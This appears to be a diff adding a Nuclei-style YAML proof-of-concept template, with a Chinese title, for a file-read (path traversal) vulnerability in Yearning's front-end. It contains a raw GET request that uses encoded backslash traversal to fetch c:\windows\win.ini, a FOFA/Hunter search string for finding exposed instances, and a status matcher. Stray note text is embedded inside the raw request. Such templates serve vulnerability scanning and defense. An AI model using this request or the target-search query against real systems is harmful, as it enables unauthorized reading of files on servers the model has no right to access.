@@ -1,0 +1,43 @@
+id: poc-fbby8eyml1zd7bob
+info:
+  name: Yearning-front-文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fbby8eyml1zd7bob'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fbby8eyml1zd7bob
+    fofa: 'fofa: app="Yearning" hunter: app.name="Yearning"'
+http:
+- raw:
+  - 'GET /front/%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cc:%5Cwindows%5Cwin.ini HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Connection: close
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    support
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
